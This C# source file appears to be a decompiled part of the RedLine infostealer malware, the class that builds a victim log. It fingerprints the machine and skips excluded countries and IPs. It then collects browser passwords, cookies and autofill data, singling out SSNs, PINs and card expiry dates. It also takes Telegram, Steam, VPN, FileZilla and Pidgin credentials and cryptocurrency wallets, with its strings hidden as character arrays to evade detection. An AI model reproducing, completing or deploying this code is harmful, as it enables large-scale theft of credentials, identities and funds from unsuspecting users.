using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using RedLine.Reburn.Data.Applications;
using RedLine.Reburn.Data.Browsers.Chromium;
using RedLine.Reburn.Data.Browsers.Gecko;
using RedLine.Reburn.Data.Extensions;
using RedLine.Reburn.Data.Helpers;
using RedLine.Reburn.Models.Browsers;
using RedLine.Reburn.Models.Enums;
using RedLine.Reburn.Models.Info;
using RedLine.Reburn.Models.Serialization;
using RedLine.Reburn.Models.WMI;

namespace RedLine.Reburn.Data.Core.LogParsers;

public class Processor : BaseLogParser
{
	public override bool TryGet(ClientSettings settings, out UserLog userLog)
	{
		userLog = default(UserLog);
		try
		{
			FirstStage(settings, ref userLog);
			SecondStage(settings, ref userLog);
			ThirdStage(settings, ref userLog);
			userLog.ReplaceEmptyValues();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static void SecondStage(ClientSettings settings, ref UserLog userLog)
	{
		userLog.HWID = CryptoHelper.GetMd5Hash(Environment.UserDomainName + Environment.UserName + SystemInfoHelper.GetDiskDrive().SerialNumber).Replace("-", string.Empty);
		if (settings.GrabScreenshot)
		{
			userLog.Screenshot = DisplayHelper.GetScreenshot();
		}
		userLog.CurrentLanguage = InputLanguage.get_CurrentInputLanguage().get_Culture().EnglishName;
		userLog.TimeZone = TimeZoneInfo.Local.DisplayName;
		dynamic val = Screen.get_PrimaryScreen().get_Bounds().Size;
		userLog.MonitorSize = $"{(object?)val.Width}x{(object?)val.Height}";
		userLog.FingerPrint = new FingerPrint
		{
			UserAgent = SystemInfoHelper.GetUserAgents(settings).FirstOrDefault().IsNull("UNKNOWN")
		};
		userLog.IsProcessElevated = false;
		userLog.OS = SystemInfoHelper.GetWindowsVersion();
		userLog.Username = Environment.UserName;
	}

	private static void FirstStage(ClientSettings settings, ref UserLog userLog)
	{
		GeoInfo geoInfo = GeoHelper.Get();
		geoInfo.IP = (string.IsNullOrWhiteSpace(geoInfo.IP) ? "UNKNOWN" : geoInfo.IP);
		geoInfo.Location = (string.IsNullOrWhiteSpace(geoInfo.Location) ? "UNKNOWN" : geoInfo.Location);
		geoInfo.Country = (string.IsNullOrWhiteSpace(geoInfo.Country) ? "UNKNOWN" : geoInfo.Country);
		geoInfo.PostalCode = (string.IsNullOrWhiteSpace(geoInfo.PostalCode) ? "UNKNOWN" : geoInfo.PostalCode);
		List<string> countryList = settings.CountryList;
		if (countryList != null && countryList.Count > 0 && settings.CountryList.Contains(geoInfo.Country))
		{
			throw new InvalidOperationException();
		}
		List<string> ipList = settings.IpList;
		if (ipList != null && ipList.Count > 0 && settings.IpList.Contains(geoInfo.IP))
		{
			throw new InvalidOperationException();
		}
		userLog.IP = geoInfo.IP;
		userLog.Location = geoInfo.Location;
		userLog.Country = geoInfo.Country;
		userLog.PostalCode = geoInfo.PostalCode;
	}

	private static void ThirdStage(ClientSettings settings, ref UserLog userLog)
	{
		userLog.Credentials = new Credentials
		{
			Defenders = new List<string>(),
			Browsers = new List<Browser>(),
			Files = new List<RemoteFile>(),
			FtpConnections = new List<LoginPair>(),
			Hardwares = new List<Hardware>(),
			InstalledBrowsers = new List<InstalledBrowserInfo>(),
			InstalledSoftwares = new List<string>(),
			Languages = new List<string>(),
			Processes = new List<string>(),
			ColdWallets = new List<ColdWallet>(),
			ImportantAutofills = new List<Autofill>(),
			SteamFiles = new List<RemoteFile>(),
			NordVPN = new List<LoginPair>(),
			OpenVPN = new List<RemoteFile>(),
			ProtonVPN = new List<RemoteFile>(),
			TelegramFiles = new List<RemoteFile>()
		};
		foreach (WmiProcessor processor in SystemInfoHelper.GetProcessors())
		{
			userLog.Credentials.Hardwares.Add(new Hardware
			{
				Caption = processor.Name,
				HardType = HardwareType.Processor,
				Parameter = processor.NumberOfCores.ToString()
			});
		}
		foreach (WmiGraphicCard item in from x in SystemInfoHelper.GetGraphicCards()
			where x.AdapterRAM != 0
			select x)
		{
			userLog.Credentials.Hardwares.Add(new Hardware
			{
				Caption = item.Name,
				HardType = HardwareType.Graphic,
				Parameter = item.AdapterRAM.ToString()
			});
		}
		userLog.Credentials.Hardwares.Add(new Hardware
		{
			Caption = new string(new char[12]
			{
				'T', 'o', 't', 'a', 'l', ' ', 'o', 'f', ' ', 'R',
				'A', 'M'
			}),
			HardType = HardwareType.Graphic,
			Parameter = SystemInfoHelper.TotalOfRAM()
		});
		userLog.Credentials.Defenders = SystemInfoHelper.SystemDefenders();
		userLog.Credentials.InstalledBrowsers = SystemInfoHelper.GetBrowsers();
		userLog.Credentials.Processes = SystemInfoHelper.ListOfProcesses();
		userLog.Credentials.InstalledSoftwares = SystemInfoHelper.ListOfPrograms();
		userLog.Credentials.Languages = SystemInfoHelper.AvailableLanguages();
		if (settings.GetTlgr)
		{
			userLog.Credentials.TelegramFiles.AddRange(TelegramGrabber.ParseFiles());
		}
		if (settings.GrabVPN)
		{
			userLog.Credentials.NordVPN.AddRange(NordVPN.GetProfile());
			userLog.Credentials.OpenVPN.AddRange(OpenVPN.ParseFiles());
			userLog.Credentials.ProtonVPN.AddRange(ProtonVPN.ParseFiles());
		}
		if (settings.GrabSteam)
		{
			userLog.Credentials.SteamFiles.AddRange(SteamGrabber.ParseFiles());
		}
		if (settings.GrabBrowsers)
		{
			List<Browser> list = new List<Browser>();
			List<string> list2 = new List<string>();
			List<string> list3 = new List<string>();
			foreach (string chromiumBrowserPath in Constants.chromiumBrowserPaths)
			{
				try
				{
					string empty = string.Empty;
					empty = ((!chromiumBrowserPath.Contains(new string(new char[5] { 'O', 'p', 'e', 'r', 'a' }))) ? (Constants.LocalAppData + chromiumBrowserPath) : (Constants.RoamingAppData + chromiumBrowserPath));
					if (!Directory.Exists(empty))
					{
						continue;
					}
					foreach (string item2 in FileSystemHelper.FindPaths(empty, 1, 1, new string(new char[10] { 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a' }), new string(new char[8] { 'W', 'e', 'b', ' ', 'D', 'a', 't', 'a' }), new string(new char[7] { 'C', 'o', 'o', 'k', 'i', 'e', 's' })))
					{
						if (!list2.Contains(item2))
						{
							list2.Add(item2);
						}
					}
				}
				catch
				{
				}
			}
			foreach (string geckoBrowserPath in Constants.geckoBrowserPaths)
			{
				try
				{
					string text = Constants.RoamingAppData + geckoBrowserPath;
					if (!Directory.Exists(text))
					{
						continue;
					}
					foreach (string item3 in FileSystemHelper.FindPaths(text, 2, 1, new string(new char[7] { 'k', 'e', 'y', '3', '.', 'd', 'b' }), new string(new char[7] { 'k', 'e', 'y', '4', '.', 'd', 'b' }), new string(new char[14]
					{
						'c', 'o', 'o', 'k', 'i', 'e', 's', '.', 's', 'q',
						'l', 'i', 't', 'e'
					}), new string(new char[11]
					{
						'l', 'o', 'g', 'i', 'n', 's', '.', 'j', 's', 'o',
						'n'
					})))
					{
						if (!list3.Contains(item3))
						{
							list3.Add(item3);
						}
					}
				}
				catch
				{
				}
			}
			list.AddRange(ChromiumEngine.ParseBrowsers(list2));
			list.AddRange(GeckoEngine.ParseBrowsers(list3));
			IEnumerable<Autofill> autofills = list.Where((Browser x) => !x.IsEmpty()).SelectMany((Browser x) => x.Autofills);
			userLog.Credentials.Browsers.AddRange(list);
			userLog.Credentials.ImportantAutofills.AddRange(FindImportant(autofills));
		}
		if (settings.GrabFiles)
		{
			userLog.Credentials.Files = RemoteFileGrabber.ParseFiles(settings.FilesToSearch);
		}
		if (settings.GrabFTP)
		{
			List<LoginPair> list4 = new List<LoginPair>();
			list4.AddRange(FileZilla.ParseConnections());
			userLog.Credentials.FtpConnections = list4;
		}
		if (settings.GrabImClients)
		{
			foreach (LoginPair item4 in Pidgin.ParseConnections())
			{
				userLog.Credentials.FtpConnections.Add(item4);
			}
		}
		if (!settings.GrabWallets)
		{
			return;
		}
		List<ColdWallet> list5 = new List<ColdWallet>();
		list5.AddRange(LocalWallets.Get());
		foreach (ColdWallet item5 in list5)
		{
			userLog.Credentials.ColdWallets.Add(item5);
		}
	}

	private static List<Autofill> FindImportant(IEnumerable<Autofill> autofills)
	{
		List<Autofill> list = new List<Autofill>();
		try
		{
			if (autofills == null)
			{
				return list;
			}
			if (autofills.Count() == 0)
			{
				return list;
			}
			string[] array = new string[13]
			{
				new string(new char[9] { 'l', 'a', 's', 't', '_', 'n', 'a', 'm', 'e' }),
				new string(new char[10] { 'f', 'i', 'r', 's', 't', '_', 'n', 'a', 'm', 'e' }),
				new string(new char[12]
				{
					'p', 'h', 'o', 'n', 'e', '_', 'n', 'u', 'm', 'b',
					'e', 'r'
				}),
				new string(new char[7] { 'a', 'd', 'd', 'r', 'e', 's', 's' }),
				new string(new char[3] { 'd', 'o', 'b' }),
				new string(new char[5] { 'e', 'm', 'a', 'i', 'l' }),
				new string(new char[9] { 'f', 'i', 'r', 's', 't', 'N', 'a', 'm', 'e' }),
				new string(new char[8] { 'l', 'a', 's', 't', 'N', 'a', 'm', 'e' }),
				new string(new char[3] { 's', 's', 'n' }),
				new string(new char[3] { 'p', 'i', 'n' }),
				new string(new char[8] { 's', 'e', 'c', 'u', 'r', 'i', 't', 'y' }),
				new string(new char[10] { 'e', 'x', 'p', 'i', 'r', 'e', 'D', 'a', 't', 'e' }),
				new string(new char[14]
				{
					'e', 'x', 'p', 'i', 'r', 'a', 't', 'i', 'o', 'n',
					'D', 'a', 't', 'e'
				})
			};
			foreach (Autofill autofill in autofills)
			{
				string[] array2 = array;
				foreach (string value in array2)
				{
					if (autofill.Name.Contains(value))
					{
						list.Add(autofill);
						break;
					}
				}
			}
		}
		catch
		{
		}
		return RedLine.Reburn.Data.Extensions.Extensions.DistinctBy(list, (Autofill x) => x.Value).IsNull(new List<Autofill>()).ToList();
	}
}
